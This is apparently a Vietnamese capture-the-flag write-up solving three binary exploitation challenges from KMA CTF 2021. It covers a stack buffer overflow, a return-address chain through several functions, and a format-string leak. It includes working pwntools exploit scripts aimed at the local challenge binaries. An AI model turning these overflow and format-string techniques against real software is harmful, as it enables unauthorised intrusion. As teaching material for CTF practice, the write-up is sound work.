# 1. KMA

Đối với các bài thử thách về Pwn, đầu tiên chúng ta sẽ kiểm tra các kiến trúc và cơ chế bảo vệ của nó như:

* Architecture: Intel x86, Intel x64, ARM, ...
* [RELRO](https://ctf101.org/binary-exploitation/relocation-read-only/): cơ chế này cho phép một số section chỉ được read (không có quyền write, execute).
* [Stack](https://ctf101.org/binary-exploitation/stack-canaries/): cơ chế này kiểm tra xem stack có bị overwrite không.
* [NX](https://ctf101.org/binary-exploitation/no-execute/): cơ chế ngăn chặn input hoặc data thực thi.
* [PIE](https://ir0nstone.gitbook.io/notes/types/stack/pie): cơ chế giúp file load vào các vùng nhớ khác nhau, làm cho địa chỉ không cố định.

Để kiểm tra, tôi sẽ sử dụng `checksec` tool.

![kma](/2021_KMACTF/images/pwn/h1.PNG "kma")

Vì đây là một challenge đơn giản, các cơ chế bảo vệ đã được disable để dễ dàng trong việc exploit.

Load vào IDA để phân tích.

![kma](/2021_KMACTF/images/pwn/h2.PNG "kma")

Luồng chương trình:
* Khởi tạo 0x20 bytes trên stack để lưu input.
* Cho phép người dùng nhập lên đến 0x100 bytes.
* Giải phóng 0x20 bytes trên stack và lệnh `pop edx` sẽ lấy giá trị để so sánh. Nếu `edx` bằng với chuỗi `_KMA` thì sẽ được vào shell.

Từ đây, tôi có thể kết luận đây là Buffer Overflow.

Để exploit ta chỉ cần nhập đủ 0x20 bytes, theo sau là chuỗi `_KMA`.

![kma](/2021_KMACTF/images/pwn/h3.PNG "kma")



# 2. Amazingg

Kiểm tra các cơ chế bảo vệ của file.

![amazingg](/2021_KMACTF/images/pwn/h4.PNG "amazingg")

Chú ý, ta thấy đây là một file 64 bit. Load file vào IDA để phân tích.

![amazingg](/2021_KMACTF/images/pwn/h5.PNG "amazingg")

Tại hàm `gets()` cho phép nhập với độ dài tùy ý, nên tôi xác định đây là Buffer Overflow.

![amazingg](/2021_KMACTF/images/pwn/h6.PNG "amazingg")

Nhìn vào các function của chương trình, tôi thấy thêm các hàm `Func1()`, `Func2()`, `Func3()`, `Puts_flag()`. 

Hàm `Puts_flag()` sẽ kiểm tra các biến `check1`, `check2`, `check3` do các hàm `Func1()`, `Func2()`, `Func3()` gán. Do vậy, ta phải lợi dụng lỗ hổng Buffer Overflow để thực thi được tất cả các hàm này mới có thể lấy được flag.

Để làm được điều này, ta phải tính toán offset hợp lý để tạo payload.
* Đầu tiên, trong hàm `main()` có lệnh `sub   rsp, 10h` và `leave` nên ta sẽ nhập đủ 0x10 bytes. (Vì sao thì các bạn xem ý nghĩa của lệnh leave).
* Tiếp theo, các hàm `Func1()`, `Func2()`, `Func3()` đều có lệnh `cmp   [rbp-4], 539h`. Nên ta sẽ nhập 4 bytes tùy ý và 0x539 để ghi đè vào `rbp`.
* Cuối cùng, `return address` tôi sẽ nhập vào các hàm cần thực thi.

Đây là script exploit.
```python
from pwn import *

p = process("./amazingg")

p.recvuntil("step....\n")

p.sendline(b"a"*16 + b"a"*4 + p32(1337) + p64(0x4006E6) + p64(0x40070E) + p64(0x400736) + p64(0x40075E))

p.interactive()
```



# 3. fs

Kiểm tra các cơ chế bảo vệ của file.

![fs](/2021_KMACTF/images/pwn/h7.PNG "fs")

Challenge này đã bật cơ chế Stack Canary, nên sẽ không có lỗ hổng Buffer Overflow nữa.

Load file vào IDA để phân tích.

![fs](/2021_KMACTF/images/pwn/h8.PNG "fs")

Trong hàm `vuln()`, tôi thấy có lệnh `printf(s);` nên tôi xác định đây là lổ hổng Format String.

Để khai thác lỗi này, ta phải tìm được offset, từ `esp` đến vùng nhớ flag được lưu trữ ở stack.

![fs](/2021_KMACTF/images/pwn/h9.PNG "fs")

Bật debug, tôi tìm được offset bắt đầu của flag sẽ là `57`. Để lấy được giá trị tại offset này, tôi dùng format `$p`.

Viết Script khai thác.

```python
from pwn import *

offset = 57
flag = ""

while True:

	p = process("./fs")

	p.recvuntil("\n")

	payload = "%" + str(offset) + "$p"
	p.sendline(payload)

	recv = p.recvuntil("\n").decode("utf-8")
	recv = recv[11:len(recv) - 1]
	if offset == 57:
		recv = recv[:len(recv) - 2]
	flag += bytes.fromhex(recv).decode('utf-8')[::-1]
	offset += 1

	print(flag)
```
